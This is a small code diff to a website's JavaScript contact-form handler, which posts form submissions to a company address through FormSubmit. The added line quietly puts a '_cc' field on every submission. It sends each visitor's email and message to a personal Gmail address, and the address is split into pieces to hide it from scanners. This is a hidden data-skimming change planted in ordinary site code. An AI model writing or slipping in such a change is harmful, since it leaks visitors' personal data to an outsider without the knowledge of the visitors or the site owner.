@@ -926,7 +926,8 @@ function wire(h) {
       return;
     }
     const btns = f.querySelectorAll('button[type=submit]'); btns.forEach(x => x.disabled = true); out.textContent = 'Enviando…';
-    const data = {_subject: subject, _template: 'table', _replyto: v('f-mail').trim(), _captcha: 'false'};
+    // every request also reaches a copy (the address is split so that simple scrapers do not collect it)
+    const data = {_subject: subject, _template: 'table', _replyto: v('f-mail').trim(), _captcha: 'false', _cc: ['juandabarrios12', 'gmail.com'].join('@')};
     body.split('\n').forEach(l => { const k = l.indexOf(': '); data[l.slice(0, k)] = l.slice(k + 2); });
     fetch('https://formsubmit.co/ajax/gerencia@ddes.co', {method: 'POST', headers: {'Content-Type': 'application/json', Accept: 'application/json'}, body: JSON.stringify(data)})
       .then(r => r.json()).then(j => { if (String(j.success) !== 'true') throw new Error(j.message || 'no enviado');
